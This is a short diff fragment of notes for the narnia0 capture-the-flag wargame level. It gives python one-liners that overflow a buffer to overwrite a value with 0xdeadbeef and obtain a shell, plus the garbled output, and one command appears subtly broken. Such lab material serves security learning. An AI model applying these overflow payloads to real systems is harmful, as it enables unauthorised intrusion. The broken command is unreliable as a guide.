@@ -4,4 +4,12 @@ python -c "print('A'*20+'B'*4)" | ./narnia0
 
 
 
+OR
 
+python -c "print ('a' * 20) + '\xef\xbe\xad\xde\x88'" ./narnia0
+
+aaaaaaaaaaaaaaaaaaaaﾭވ
+
+paste it on the console then you will get a shell
+
+=> if you dont like the shell you can always execute /bin/bash ;)
